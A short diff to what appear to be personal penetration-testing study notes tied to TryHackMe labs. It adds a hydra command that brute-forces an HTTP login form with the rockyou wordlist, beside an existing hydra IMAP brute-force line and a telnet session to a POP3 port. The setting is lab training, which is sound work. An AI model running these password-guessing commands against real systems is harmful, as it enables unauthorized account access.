@@ -311,6 +311,9 @@ input validation, negative value ?
 cuelang, synk
 
 hydra -l lazie -P /mnt/c/D/SecLists-master/Passwords/Common-Credentials/common-passwords-win.txt 10.10.112.12 imap
+	
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.234.98 http-post-form "/login.php:username=admin&password=^PASS^&Submit=Login:Warning"
+
            
 pentester@TryHackMe$ telnet MACHINE_IP 110
 Trying MACHINE_IP...
